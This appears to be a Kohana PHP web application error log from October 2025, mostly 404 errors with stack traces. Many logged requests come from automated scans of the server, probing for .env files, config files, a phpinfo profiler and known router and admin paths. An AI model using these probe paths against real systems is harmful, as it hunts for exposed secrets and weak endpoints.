2025-10-24 09:40:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:41:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:41:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:44:08 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:44:08 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:58:15 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 09:58:15 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 09:59:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app_dev.php/_profiler/phpinfo ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app_dev.php/_profiler/phpinfo ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: old/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: old/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: new/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: new/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL frontend/web/debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:59:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL frontend/web/debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:59:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _static/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _static/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: download/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: download/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: saas/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: saas/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL infos was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:59:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL infos was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:59:21 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:21 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: templates/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: templates/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: stag/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: stag/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public_html/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public_html/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: portal/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: portal/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: project/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: project/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/parameters.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/parameters.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:59:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: exapi/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:59:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: exapi/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 10:09:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 10:09:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 10:15:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 10:15:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 10:15:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 10:15:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 10:19:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 10:19:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 10:39:16 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 10:39:16 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 11:00:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: autodiscover/autodiscover.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 11:00:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: autodiscover/autodiscover.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 11:37:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 11:37:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 11:52:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 11:52:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:07:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:07:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:18:08 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 12:18:08 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 12:44:58 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 12:44:58 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 12:46:08 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 12:46:08 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 12:46:09 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 12:46:09 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 12:58:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www.q8grandlimo.com ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:58:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www.q8grandlimo.com ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:58:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: driver/www.q8grandlimo.com ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:58:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: driver/www.q8grandlimo.com ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:58:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: driver/pricing.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:58:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: driver/pricing.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:58:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: driver/how_it_works.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:58:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: driver/how_it_works.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:59:09 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/+ path + was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 12:59:09 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/+ path + was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 12:59:24 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL a was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 12:59:24 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL a was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 12:59:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/www.q8grandlimo.com ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:59:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/www.q8grandlimo.com ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:59:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/pricing.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:59:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/pricing.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:59:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/how_it_works.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:59:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/how_it_works.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:59:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-4.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:59:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-4.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 12:59:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-1.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 12:59:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-1.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:07:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:07:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:09:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL manager/text/list was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:09:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL manager/text/list was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:10:06 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 13:10:06 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 13:20:34 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 13:20:34 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 13:20:40 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 13:20:40 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/WPnBr.dll ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/WPnBr.dll ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL sdk was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL sdk was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: menu.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: menu.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CSS/Miniweb.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CSS/Miniweb.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL nmaplowercheck1761301240 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL nmaplowercheck1761301240 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL nmaplowercheck1761301240 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL nmaplowercheck1761301240 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
